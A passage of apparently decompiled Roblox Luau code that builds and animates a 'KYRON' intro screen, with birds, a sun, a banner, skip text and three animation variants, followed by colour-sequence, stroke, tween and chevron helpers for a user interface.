          frame6.Rotation = 22
          frame6.ZIndex = frame5.ZIndex
          frame6.Parent = frame5
          local uiCorner = Instance.new("UICorner")
          uiCorner.CornerRadius = UDim.new(1, 0)
          uiCorner.Parent = frame6
          local clone = frame6:Clone()
          clone.Name = "RightWing"
          clone.Position = UDim2.new(0.5, n35 * 0.23, 0.5, 0)
          clone.Rotation = -22
          clone.Parent = frame5
          local clone2 = frame6:Clone()
          clone2.Name = "LeftFeather"
          clone2.Position = UDim2.new(0.5, -n35 * 0.3, 0.5, n36 * 1.15)
          local max = math.max
          clone2.Size = UDim2.fromOffset(math.floor(n35 * 0.68), max(1, n36 - 1))
          clone2.Rotation = 34
          clone2.Parent = frame5
          local clone3 = clone2:Clone()
          clone3.Name = "RightFeather"
          clone3.Position = UDim2.new(0.5, n35 * 0.3, 0.5, n36 * 1.15)
          clone3.Rotation = -34
          clone3.Parent = frame5
          local uiScale4 = Instance.new("UIScale")
          local scale = 0.76 + arg % 4 * 0.1
          uiScale4.Scale = scale
          uiScale4.Parent = frame5

          tbl54.birds[arg] = {
            frame = frame5,
            leftWing = frame6,
            rightWing = clone,
            leftFeather = clone2,
            rightFeather = clone3,
            scale = uiScale4,
            baseScale = scale,
            phase = (arg - 1) / 6 * 3.1415926535897931 * 2,
            radiusX = 0.22 + arg % 3 * 0.045,
            radiusY = 0.13 + arg % 2 * 0.045,
            speed = 0.2 + arg % 3 * 0.025,
          }
        end

        for i = 1, 6 do
          tbl54.addBird(i)
        end

        tbl54.addAtmosphere = function()
          local frame5 = Instance.new("Frame")
          frame5.Name = "GojoGoldenSun"
          frame5.BackgroundTransparency = 1
          frame5.BorderSizePixel = 0
          frame5.AnchorPoint = Vector2.new(0.5, 0.5)
          frame5.Position = UDim2.fromScale(0.5, 0.43)
          frame5.Size = flag28 and UDim2.fromOffset(260, 260) or UDim2.fromOffset(500, 500)
          frame5.Visible = KYRONCurrentIntroVariant == "gojo"
          frame5.ZIndex = 950
          frame5.Parent = frame2
          tbl54.sunRoot = frame5
          local uiScale4 = Instance.new("UIScale")
          uiScale4.Scale = 1
          uiScale4.Parent = frame5
          tbl54.sunScale = uiScale4
          local tbl66 = {}
          local tbl67 = { size = 1.1, color = Color3.fromRGB(240, 126, 22), target = 0.9 }
          local tbl68 = { size = 1.03, color = Color3.fromRGB(255, 177, 35), target = 0.76 }
          local tbl69 = { size = 0.96, color = Color3.fromRGB(255, 218, 77), target = 0.4 }
          tbl66[1] = tbl67
          tbl66[2] = tbl68
          tbl66[3] = tbl69

          for i, v79 in ipairs(tbl66) do
            local instance2 = Instance.new("Frame")
            instance2.Name = "GoldenSunLayer" .. i
            instance2.BackgroundColor3 = v79.color
            instance2.BackgroundTransparency = 1
            instance2.BorderSizePixel = 0
            instance2.AnchorPoint = Vector2.new(0.5, 0.5)
            instance2.Position = UDim2.fromScale(0.5, 0.5)
            instance2.Size = UDim2.fromScale(v79.size, v79.size)
            instance2.ZIndex = frame5.ZIndex + i
            instance2.Parent = frame5
            local instance3 = Instance.new("UICorner")
            instance3.CornerRadius = UDim.new(1, 0)
            instance3.Parent = instance2

            if i == #tbl66 then
              local uiGradient = Instance.new("UIGradient")
              local colorSequence = ColorSequence.new
              local tbl70 = {}
              local v80 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 200, 137))
              local v81 = ColorSequenceKeypoint.new(0.48, Color3.fromRGB(255, 205, 54))
              tbl70[1] = v80
              tbl70[2] = v81

              do
                local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 126, 7)))
                table.move(values, 1, values.n, 3, tbl70)
              end

              uiGradient.Color = colorSequence(tbl70)
              uiGradient.Rotation = 48
              uiGradient.Parent = instance2
            end

            tbl54.sunLayers[i] = { frame = instance2, target = v79.target }
          end
        end

        tbl54.addAtmosphere()
        local instance2 = Instance.new("ImageLabel")
        instance2.Name = "IntroBanner"
        instance2.BackgroundTransparency = 1
        instance2.Image = "rbxassetid://135088241492683"
        instance2.ImageColor3 = Color3.fromRGB(255, 240, 255)
        instance2:SetAttribute("_NoKYRONTheme", true)
        instance2.ImageTransparency = 1
        instance2.ScaleType = Enum.ScaleType.Fit
        instance2.AnchorPoint = Vector2.new(0.5, 0.5)
        instance2.Position = UDim2.new(0.5, 0, 0.42, 0)
        instance2.Size = flag28 and UDim2.new(0.38, 0, 0, 78) or UDim2.new(0.92, 0, 0, 170)
        instance2.ZIndex = 1002
        instance2.Parent = frame2
        local textLabel = Instance.new("TextLabel")
        textLabel.Name = "TapAnywhere"
        textLabel.BackgroundTransparency = 1
        textLabel.Text = "TAP ANYWHERE TO SKIP"
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextTransparency = 1
        textLabel.TextSize = flag28 and 18 or 44
        textLabel.Font = Enum.Font.GothamBlack
        textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
        textLabel.Position = flag28 and UDim2.new(0.5, 0, 0.42, 58) or UDim2.fromScale(0.5, 0.82)
        textLabel.Size = UDim2.new(0.7, 0, 0, 20)
        textLabel.TextXAlignment = Enum.TextXAlignment.Center
        textLabel.ZIndex = 1003
        textLabel.Parent = frame2
        local textLabel2 = Instance.new("TextLabel")
        textLabel2.Name = "KYRONInvite"
        textLabel2.BackgroundTransparency = 1
        textLabel2.Text = "KYRON"
        textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel2.TextTransparency = 1
        textLabel2.TextSize = flag28 and 12 or 40
        textLabel2.Font = Enum.Font.GothamBlack
        textLabel2.AnchorPoint = Vector2.new(0.5, 0.5)
        textLabel2.Position = flag28 and UDim2.new(0.5, 0, 0.42, 80) or UDim2.fromScale(0.5, 0.89)
        textLabel2.Size = UDim2.new(0.7, 0, 0, 18)
        textLabel2.TextXAlignment = Enum.TextXAlignment.Center
        textLabel2.ZIndex = 1003
        textLabel2.Parent = frame2
        local frame5 = Instance.new("Frame")
        frame5.Name = "IntroCaptionShield"
        frame5.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
        frame5.BackgroundTransparency = 1
        frame5.BorderSizePixel = 0
        frame5.AnchorPoint = Vector2.new(0.5, 0.5)
        frame5.Position = UDim2.new(0.5, 0, 0.42, flag28 and 70 or 124)
        frame5.Size = UDim2.new(0.58, 0, 0, 48)
        frame5.ZIndex = 1002
        frame5.Parent = frame2
        frame5.Visible = false
        local instance3 = Instance.new("UICorner")
        instance3.CornerRadius = UDim.new(0, 14)
        instance3.Parent = frame5
        local uiGradient = Instance.new("UIGradient")
        local numberSequence = NumberSequence.new
        local tbl66 = {}
        local v79 = NumberSequenceKeypoint.new(0, 0.94)
        local v80 = NumberSequenceKeypoint.new(0.16, 0.14)
        local v81 = NumberSequenceKeypoint.new(0.84, 0.14)
        local new = NumberSequenceKeypoint.new
        tbl66[1] = v79
        tbl66[2] = v80
        tbl66[3] = v81

        do
          local values = table.pack(new(1, 0.94))
          table.move(values, 1, values.n, 4, tbl66)
        end

        uiGradient.Transparency = numberSequence(tbl66)
        uiGradient.Parent = frame5
        local textButton = Instance.new("TextButton")
        textButton.Name = "TapCatcher"
        textButton.BackgroundTransparency = 1
        textButton.Text = ""
        textButton.AutoButtonColor = false
        textButton.Size = UDim2.new(1, 0, 1, 0)
        textButton.ZIndex = 1004
        textButton.Parent = frame2
        local blurEffect = Instance.new("BlurEffect")
        blurEffect.Name = "KYRONIntroBlur"
        blurEffect:SetAttribute("_KYRONIntroEffect", true)
        blurEffect.Size = 0
        blurEffect.Parent = Lighting_2
        local flag29 = false
        local flag30 = false
        local flag31 = false
        local flag32 = false
        local flag33 = false
        local connection2 = nil
        local v82 = nil
        local v83 = nil

        _G._KYRONIntroCleanup = function()
          flag29 = true
          flag31 = false
          flag32 = false
          flag33 = false
          tbl54.active = false

          if connection2 then
            connection2:Disconnect()
            connection2 = nil
          end

          _G._KYRONIntroPlaying = false

          if v82 and v82.Parent then
            v82:Destroy()
          end

          if v83 and v83.Parent then
            v83:Destroy()
          end

          if frame2 and frame2.Parent then
            frame2:Destroy()
          end

          if blurEffect and blurEffect.Parent then
            blurEffect:Destroy()
          end
        end

        local function fn57()
          flag31 = true
          local rotation = imageLabel.Rotation

          while flag31 and not flag29 do
            rotation += 50
            TweenService:Create(imageLabel, TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Rotation = rotation }):Play()
            TweenService:Create(uiScale, TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 1.035 }):Play()
            task.wait(0.14)
            TweenService:Create(uiScale, TweenInfo.new(0.32, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 1 }):Play()
            task.wait(0.78)
          end
        end

        local function fn58()
          flag32 = true
          local n34 = 0
          local v84 = 0
          local v85 = nil
          local n35 = nil
          local n36 = nil
          local v86 = nil
          local n37 = nil

          connection2 = RunService.RenderStepped:Connect(function(deltaTime)
            if not flag32 or flag29 then
              return
            end
            v84 += deltaTime
            local n38, n39, n40

            if v84 <= 2.1 then
              n34 = (n34 + deltaTime * 1920 * -1) % 360
              n38 = n34
              n39 = 1
              local parent = v83 and v83.Parent
              n40 = -1

              if parent then
                v83.PlaybackSpeed = 1
              end
            elseif v84 <= 3.3 then
              local n41 = (v84 - 2.1) / 1.2

              if not v85 then
                v85 = n34
                n35 = 82

                while (n35 - v85) * -1 < 1180 do
                  n35 += -360
                end

                n36 = n35 - 230
              end

              local n42 = n41 * n41
              local n43 = n42 * n41
              n38 = (2 * n43 - 3 * n42 + 1) * v85 + (n43 - 2 * n42 + n41) * -2304 + (-2 * n43 + 3 * n42) * n35 + (n43 - n42) * -384
              n34 = n38
              local n44 = ((6 * n42 - 6 * n41) * v85 + (3 * n42 - 4 * n41 + 1) * -2304 + (-6 * n42 + 6 * n41) * n35 + (3 * n42 - 2 * n41) * -384) / 1.2
              n39 = math.clamp(math.abs(n44) / 1920, 0.16, 1)
              n40 = n44 >= 0 and 1 or -1

              if v83 and v83.Parent then
                local v87 = 0
                v83.PlaybackSpeed = 0.35 + 0.45 * math.clamp(math.abs(n44) / 1920, v87, 1)
              end
            elseif v84 <= 5.8 then
              n36 = n36 or -34

              if not v86 then
                v86 = n35
                n37 = -320
              end

              n37 += math.sin(math.rad((n36 - v86 + 180) % 360 - 160)) * 1100 * deltaTime
              n37 *= math.exp(-2.8 * deltaTime)
              v86 += n37 * deltaTime
              n38 = v86
              n40 = n37 >= 0 and 1 or -1
              n39 = math.clamp(math.abs(n37) / 900, 0, 0.3)

              if v83 and v83.Parent then
                v83.PlaybackSpeed = 0.5 + 0.22 * math.clamp(math.abs(n37) / 320, 0, 1)
              end
            else
              n38 = n36 or -34
              n39 = 0
              local parent = v83 and v83.Parent
              n40 = 1

              if parent then
                v83.PlaybackSpeed = 0.5
              end
            end

            for i, v87 in ipairs(tbl39) do
              local flag34 = i == #tbl39
              v87.Rotation = n38 + tbl41[i] * n39 * n40

              if v84 > 2.1 and not flag34 then
                local v88 = tbl42[i]
                tbl40[i].ImageTransparency = v88 + (1 - v88) * (1 - n39)
              end
            end
          end)
        end

        local function fn59()
          flag33 = true

          task.spawn(function()
            for _, v84 in ipairs(tbl50) do
              fn56(v84, UDim2.new(0.5, -1, 0.5, -3), -1)
            end

            task.wait(0.18)
            if not flag33 or flag29 then
              return
            end
            local flag34 = false

            while flag33 and not flag29 do
              flag34 = not flag34
              local udim2 = flag34 and UDim2.new(0.5, -1, 0.5, -2) or UDim2.new(0.5, 1, 0.5, 1)
              local n34 = flag34 and -1 or 1

              for _, v84 in ipairs(tbl50) do
                fn56(v84, udim2, n34, TweenInfo.new(1.05, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut))
              end

              local udim22 = flag34 and UDim2.new(0.5, -2, 0.5, -3) or UDim2.new(0.5, 2, 0.5, 2)
              local n35 = flag34 and -2 or 2

              for _, v84 in ipairs(tbl51) do
                fn56(v84, udim22, n35, TweenInfo.new(1.05, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut))
              end

              task.wait(1.08)
            end
          end)
        end

        tbl54.play = function()
          tbl54.active = true

          task.spawn(function()
            local now2 = os.clock()
            local layers = tbl54.layers

            while tbl54.active and not flag29 do
              local n34 = (os.clock() - now2) * 2.5
              local v84 = math.sin(n34 * 0.82)
              local v85 = math.sin(n34 * 0.68 + 0.45)
              tbl54.stage.Position = UDim2.new(0.5, math.sin(n34 * 0.57 + 0.8) * 4, 0.42, v84 * 6)
              tbl54.stage.Rotation = -38 + v85 * 1.15
              tbl54.scale.Scale = 1 + math.sin(n34 * 0.73 + 1.2) * 0.014
              local v86 = 0.62
              layers.torso.image.Rotation = math.sin(n34 * 0.76) * v86
              layers.head.image.Rotation = math.sin(n34 * 0.92 + 0.65) * 1.55
              layers.hair.image.Rotation = math.sin(n34 * 1.08 + 1.1) * 0.85
              layers.leftHand.image.Rotation = math.sin(n34 * 0.88 + 0.25) * 3.25
              layers.rightHand.image.Rotation = math.sin(n34 * 0.96 + 2.35) * 3.15
              layers.straightLeg.image.Rotation = math.sin(n34 * 0.72 + 0.2) * 4
              layers.straightBoot.image.Rotation = math.sin(n34 * 0.91 + 0.75) * 1.25
              layers.bentLeg.image.Rotation = math.sin(n34 * 0.79 + 3.05) * 4.15
              layers.bentBoot.image.Rotation = math.sin(n34 * 0.98 + 3.55) * 1.35

              for _, bird in ipairs(tbl54.birds) do
                local n35 = n34 * bird.speed + bird.phase
                local n36 = math.sin(n34 * 3.8 + bird.phase) * 7.5
                local n37 = (math.sin(n35) + 1) * 0.5
                local radiusX = bird.radiusX
                local radiusY = bird.radiusY
                bird.frame.Position = UDim2.fromScale(0.5 + math.cos(n35) * radiusX, 0.42 + math.sin(n35 * 1.08) * radiusY + math.sin(n34 * 1.3 + bird.phase) * 0.012)
                bird.frame.Rotation = math.sin(n35 * 1.7) * 5
                bird.scale.Scale = bird.baseScale * (0.91 + n37 * 0.13)
                bird.leftWing.Rotation = 20 + n36
                bird.rightWing.Rotation = -24 - n36
                bird.leftFeather.Rotation = 32 + n36 * 0.72
                bird.rightFeather.Rotation = -32 - n36 * 0.72
              end

              tbl54.sunScale.Scale = 1 + math.sin(n34 * 0.18 + 0.6) * 0.018
              RunService.RenderStepped:Wait()
            end
          end)
        end

        local function fn60()
          if not flag30 or flag29 then
            return
          end
          flag29 = true
          flag31 = false
          flag32 = false
          flag33 = false
          tbl54.active = false

          if connection2 then
            connection2:Disconnect()
            connection2 = nil
          end

          if v82 and v82.Parent then
            TweenService:Create(v82, TweenInfo.new(0.5, Enum.EasingStyle.Linear), { Volume = 0 }):Play()

            task.delay(0.5, function()
              if v82 and v82.Parent then
                v82:Destroy()
              end
            end)
          end

          if v83 and v83.Parent then
            TweenService:Create(v83, TweenInfo.new(0.5, Enum.EasingStyle.Linear), { Volume = 0 }):Play()

            task.delay(0.5, function()
              if v83 and v83.Parent then
                v83:Destroy()
              end
            end)
          end

          local tweenInfo = TweenInfo.new(0.42, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
          TweenService:Create(frame2, tweenInfo, { BackgroundTransparency = 1 }):Play()
          TweenService:Create(instance2, tweenInfo, { ImageTransparency = 1 }):Play()

          if KYRONCurrentIntroVariant == "gojo" then
            if tbl54.scale then
              TweenService:Create(tbl54.scale, tweenInfo, { Scale = 0.06 }):Play()
            end

            if tbl54.sunScale then
              TweenService:Create(tbl54.sunScale, tweenInfo, { Scale = 0.06 }):Play()
            end
          end

          if KYRONCurrentIntroVariant == "wheel" then
            local tbl67 = { Rotation = imageLabel.Rotation + 90 }
            TweenService:Create(imageLabel, TweenInfo.new(0.42, Enum.EasingStyle.Linear), tbl67):Play()
          end

          TweenService:Create(imageLabel, tweenInfo, { ImageTransparency = 1 }):Play()

          for _, v84 in ipairs(tbl40) do
            TweenService:Create(v84, tweenInfo, { ImageTransparency = 1 }):Play()
          end

          for _, v84 in ipairs(tbl43) do
            TweenService:Create(v84, tweenInfo, { ImageTransparency = 1 }):Play()
            local v85 = ipairs
            local tbl67 = tbl44[v84] or {}

            for _, v86 in v85(tbl67) do
              TweenService:Create(v86.image, tweenInfo, { ImageTransparency = 1 }):Play()
            end

            local v86 = ipairs
            local tbl68 = tbl45[v84] or {}

            for _, v87 in v86(tbl68) do
              TweenService:Create(v87.image, tweenInfo, { ImageTransparency = 1 }):Play()
            end

            local v87 = tbl46[v84]

            if v87 then
              if v87.gradientTween then
                v87.gradientTween:Cancel()
              end

              if v87.pulseTween then
                v87.pulseTween:Cancel()
              end

              TweenService:Create(v87.image, tweenInfo, { ImageTransparency = 1 }):Play()
            end
          end

          TweenService:Create(imageLabel2, tweenInfo, { ImageTransparency = 1 }):Play()

          for _, piece in ipairs(tbl54.pieces) do
            TweenService:Create(piece, tweenInfo, { ImageTransparency = 1 }):Play()
          end

          for _, bird in ipairs(tbl54.birds) do
            TweenService:Create(bird.leftWing, tweenInfo, { BackgroundTransparency = 1 }):Play()
            TweenService:Create(bird.rightWing, tweenInfo, { BackgroundTransparency = 1 }):Play()
            TweenService:Create(bird.leftFeather, tweenInfo, { BackgroundTransparency = 1 }):Play()
            TweenService:Create(bird.rightFeather, tweenInfo, { BackgroundTransparency = 1 }):Play()
          end

          for _, sunLayer in ipairs(tbl54.sunLayers) do
            TweenService:Create(sunLayer.frame, tweenInfo, { BackgroundTransparency = 1 }):Play()
          end

          TweenService:Create(frame5, tweenInfo, { BackgroundTransparency = 1 }):Play()
          TweenService:Create(textLabel, tweenInfo, { TextTransparency = 1 }):Play()
          TweenService:Create(textLabel2, tweenInfo, { TextTransparency = 1 }):Play()
          TweenService:Create(blurEffect, tweenInfo, { Size = 0 }):Play()

          task.delay(0.42, function()
            if frame2 and frame2.Parent then
              frame2:Destroy()
            end

            if blurEffect and blurEffect.Parent then
              blurEffect:Destroy()
            end

            _G._KYRONIntroPlaying = false
            local KYRONRevealMainAfterIntro = _G._KYRONRevealMainAfterIntro
            _G._KYRONRevealMainAfterIntro = nil

            if KYRONRevealMainAfterIntro then
              KYRONRevealMainAfterIntro()
            end
          end)
        end

        textButton.Activated:Connect(fn60)

        local function fn61()
          if flag30 or flag29 then
            return false
          end
          flag30 = true
          frame2.Visible = true
          TweenService:Create(frame2, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 0.5 }):Play()
          TweenService:Create(blurEffect, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = 10 }):Play()
          TweenService:Create(instance2, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { ImageTransparency = 0 }):Play()

          if KYRONCurrentIntroVariant == "wheel" then
            TweenService:Create(imageLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { ImageTransparency = 0 }):Play()
          elseif KYRONCurrentIntroVariant == "chainSpear" then
            instance.Visible = true

            for _, v84 in ipairs(tbl40) do
              v84.Visible = true
              TweenService:Create(v84, TweenInfo.new(0.32, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { ImageTransparency = v84:GetAttribute("_KYRONTargetTransparency") }):Play()
            end
          elseif KYRONCurrentIntroVariant == "gojo" then
            tbl54.stage.Visible = true
            tbl54.sunRoot.Visible = true

            for _, sunLayer in ipairs(tbl54.sunLayers) do
              local tbl67 = { BackgroundTransparency = sunLayer.target }
              TweenService:Create(sunLayer.frame, TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), tbl67):Play()
            end

            for i, piece in ipairs(tbl54.pieces) do
              task.delay((i - 1) * 0.03, function()
                if not flag29 and piece.Parent then
                  TweenService:Create(piece, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { ImageTransparency = 0 }):Play()
                end
              end)
            end

            for i, bird in ipairs(tbl54.birds) do
              bird.frame.Visible = true

              task.delay(0.08 + (i - 1) * 0.055, function()
                if not flag29 and bird.frame.Parent then
                  TweenService:Create(bird.leftWing, TweenInfo.new(0.3), { BackgroundTransparency = 0.04 }):Play()
                  TweenService:Create(bird.rightWing, TweenInfo.new(0.25), { BackgroundTransparency = 0.04 }):Play()
                  TweenService:Create(bird.leftFeather, TweenInfo.new(0.3), { BackgroundTransparency = 0.22 }):Play()
                  TweenService:Create(bird.rightFeather, TweenInfo.new(0.3), { BackgroundTransparency = 0.22 }):Play()
                end
              end)
            end
          else
            local tbl67 = { ImageTransparency = 0 }
            TweenService:Create(imageLabel2, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), tbl67):Play()

            for i, v84 in ipairs(tbl43) do
              task.delay((i - 1) * 0.035, function()
                if not flag29 and v84.Parent then
                  local tbl68 = { ImageTransparency = 0 }
                  TweenService:Create(v84, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), tbl68):Play()
                  local v85 = ipairs
                  local tbl69 = tbl44[v84] or {}

                  for _, v86 in v85(tbl69) do
                    TweenService:Create(v86.image, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { ImageTransparency = 0.15 }):Play()
                  end

                  local v86 = ipairs
                  local tbl70 = tbl45[v84] or {}

                  for _, v87 in v86(tbl70) do
                    local tbl71 = { ImageTransparency = 0 }
                    TweenService:Create(v87.image, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), tbl71):Play()
                  end

                  local v87 = tbl46[v84]

                  if v87 then
                    TweenService:Create(v87.image, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { ImageTransparency = 0.25 }):Play()
                    v87.gradient.Offset = Vector2.new(-1, 0)
                    v87.gradientTween = TweenService:Create(v87.gradient, TweenInfo.new(1.15, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), { Offset = Vector2.new(1, 0) })
                    v87.gradientTween:Play()
                    v87.pulseTween = TweenService:Create(v87.image, TweenInfo.new(0.72, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), { ImageTransparency = 0.58 })
                    v87.pulseTween:Play()
                  end
                end
              end)
            end
          end

          TweenService:Create(frame5, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 0.08 }):Play()
          TweenService:Create(textLabel, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { TextTransparency = 0.05 }):Play()
          TweenService:Create(textLabel2, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { TextTransparency = 0.05 }):Play()

          if KYRONCurrentIntroVariant == "wheel" then
            task.spawn(fn57)
          elseif KYRONCurrentIntroVariant == "chainSpear" then
            fn58()
          elseif KYRONCurrentIntroVariant == "gojo" then
            tbl54.play()
          else
            fn59()
          end

          task.delay(6, fn60)
          return true
        end

        fn61()

        task.defer(function()
          RunService.RenderStepped:Wait()

          playIntroMusic(function(arg)
            if flag29 then
              return false
            end
            v82 = arg
            return true
          end)

          if KYRONCurrentIntroVariant == "chainSpear" then
            playChainSpearAudio(function(arg)
              if flag29 then
                return false
              end
              v83 = arg
              return true
            end)
          end
        end)
      end

      _G._KYRONPlayIntro = KYRONPlayIntro

      if false then
        KYRONPlayIntro()
      else
        _G._KYRONIntroEnabled = false
        _G._KYRONIntroPlaying = false
      end

      local v78

      do
        local colorSequence = ColorSequence.new
        local tbl38 = {}
        local v79 = ColorSequenceKeypoint.new(0, Color3.fromRGB(240, 240, 255))
        local v80 = ColorSequenceKeypoint.new(0.25, Color3.fromRGB(160, 185, 230))
        local v81 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(240, 255, 240))
        local v82 = ColorSequenceKeypoint.new(0.75, Color3.fromRGB(160, 165, 200))
        local new = ColorSequenceKeypoint.new
        local color2 = Color3.fromRGB
        local v83 = 240
        tbl38[1] = v79
        tbl38[2] = v80
        tbl38[3] = v81
        tbl38[4] = v82

        do
          local values = table.pack(new(1, color2(255, v83, 255)))
          table.move(values, 1, values.n, 5, tbl38)
        end

        v78 = colorSequence(tbl38)
      end

      local v79

      do
        local colorSequence = ColorSequence.new
        local tbl38 = {}
        local v80 = ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40))
        local v81 = ColorSequenceKeypoint.new(0.25, Color3.fromRGB(30, 25, 25))
        local v82 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 40, 40))
        local v83 = ColorSequenceKeypoint.new(0.75, Color3.fromRGB(20, 20, 20))
        local new = ColorSequenceKeypoint.new
        local color2 = Color3.fromRGB
        local v84 = 35
        tbl38[1] = v80
        tbl38[2] = v81
        tbl38[3] = v82
        tbl38[4] = v83

        do
          local values = table.pack(new(1, color2(v84, 40, 40)))
          table.move(values, 1, values.n, 5, tbl38)
        end

        v79 = colorSequence(tbl38)
      end

      local v80

      do
        local colorSequence = ColorSequence.new
        local tbl38 = {}
        local v81 = ColorSequenceKeypoint.new(0, Color3.fromRGB(88, 88, 96))
        local v82 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(38, 38, 45))
        local new = ColorSequenceKeypoint.new
        local color2 = Color3.fromRGB
        tbl38[1] = v81
        tbl38[2] = v82

        do
          local values = table.pack(new(1, color2(88, 88, 96)))
          table.move(values, 1, values.n, 3, tbl38)
        end

        v80 = colorSequence(tbl38)
      end

      local v81

      do
        local numberSequence = NumberSequence.new
        local tbl38 = {}
        local v82 = NumberSequenceKeypoint.new(0, 0.12)
        local v83 = NumberSequenceKeypoint.new(0.5, 0.02)
        local new = NumberSequenceKeypoint.new
        tbl38[1] = v82
        tbl38[2] = v83

        do
          local values = table.pack(new(1, 0.12))
          table.move(values, 1, values.n, 3, tbl38)
        end

        v81 = numberSequence(tbl38)
      end

      local v82

      do
        local numberSequence = NumberSequence.new
        local tbl38 = {}
        local v83 = NumberSequenceKeypoint.new(0, 0.5)
        local v84 = NumberSequenceKeypoint.new(0.25, 0.2)
        local v85 = NumberSequenceKeypoint.new(0.5, 0)
        local v86 = NumberSequenceKeypoint.new(0.75, 0.2)
        local new = NumberSequenceKeypoint.new
        tbl38[1] = v83
        tbl38[2] = v84
        tbl38[3] = v85
        tbl38[4] = v86

        do
          local values = table.pack(new(1, 0.5))
          table.move(values, 1, values.n, 5, tbl38)
        end

        v82 = numberSequence(tbl38)
      end

      local v83

      do
        local numberSequence = NumberSequence.new
        local tbl38 = {}
        local v84 = NumberSequenceKeypoint.new(0, 0.92)
        local v85 = NumberSequenceKeypoint.new(0.25, 0.65)
        local v86 = NumberSequenceKeypoint.new(0.5, 0.38)
        local v87 = NumberSequenceKeypoint.new(0.75, 0.72)
        local new = NumberSequenceKeypoint.new
        tbl38[1] = v84
        tbl38[2] = v85
        tbl38[3] = v86
        tbl38[4] = v87

        do
          local values = table.pack(new(1, 0.92))
          table.move(values, 1, values.n, 5, tbl38)
        end

        v83 = numberSequence(tbl38)
      end

      local fn56

      fn56 = function(parent, arg)
        local instance = Instance.new("UICorner")
        instance.CornerRadius = UDim.new(0, arg)
        instance.Parent = parent
        return instance
      end

      local fn57, tbl38, fn58, v84, v85, instance

      do
        local function createUIStroke(parent, transparency)
          local uiStroke = Instance.new("UIStroke")
          uiStroke.Color = tbl37.stroke
          uiStroke.Thickness = 1
          uiStroke.Transparency = transparency or 0.28
          uiStroke.Parent = parent
          return uiStroke
        end

        fn57 = function(parent, thickness)
          local uiStroke = Instance.new("UIStroke")
          uiStroke.Color = Color3.fromRGB(255, 240, 255)
          uiStroke.Thickness = thickness or 1.25
          uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
          uiStroke.Parent = parent
          local uiGradient = Instance.new("UIGradient")
          uiGradient.Color = v79
          uiGradient.Transparency = v83
          uiGradient.Rotation = 135
          uiGradient.Parent = uiStroke
          return uiStroke, uiGradient
        end

        tbl38 = {}
        local obj = setmetatable({}, { __mode = "k" })

        tbl38.tween = function(arg, arg2, arg3, arg4)
          local tbl39 = obj[arg]

          if not tbl39 then
            tbl39 = {}
            obj[arg] = tbl39
          end

          if tbl39[arg2] then
            tbl39[arg2]:Cancel()
          end

          local tween = TweenService:Create(arg, TweenInfo.new(arg3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), arg4)
          tbl39[arg2] = tween
          tween:Play()
          return tween
        end

        tbl38.chevron = function(parent)
          parent.Text = ""
          parent.BackgroundTransparency = 1
          local uiStroke = parent:FindFirstChildOfClass("UIStroke")

          if uiStroke then
            uiStroke:Destroy()
          end

          local frame2 = Instance.new("Frame")
          frame2.Name = "Chevron"
          frame2.BackgroundTransparency = 1
          frame2.Size = UDim2.fromOffset(16, 24)
          frame2.AnchorPoint = Vector2.new(0.5, 0.5)
          frame2.Position = UDim2.fromScale(0.5, 0.5)
          frame2.ZIndex = parent.ZIndex + 1
          frame2.Parent = parent

          for i = 1, 2 do
            local frame3 = Instance.new("Frame")
            frame3.Name = "ChevronLine"
            frame3.AnchorPoint = Vector2.new(0.5, 0.5)
            frame3.Size = UDim2.fromOffset(7, 1.5)
            frame3.Position = UDim2.new(0.5, i == 1 and -2.25 or 2.25, 0.5, 0)
            frame3.Rotation = i == 1 and 35 or -40
            frame3.BorderSizePixel = 0
            frame3.BackgroundColor3 = tbl37.text
            frame3.BackgroundTransparency = 0.28
            frame3.ZIndex = frame2.ZIndex
            frame3.Parent = frame2
          end

          parent.MouseEnter:Connect(function()
            tbl38.tween(parent, "hover", 0.14, { BackgroundTransparency = 0.5 })
          end)

          parent.MouseLeave:Connect(function()
            tbl38.tween(parent, "hover", 0.14, { BackgroundTransparency = 1 })
          end)
        end

        tbl38.expanded = function(arg, arg2)
          local chevron = arg:FindFirstChild("Chevron")

          if chevron then
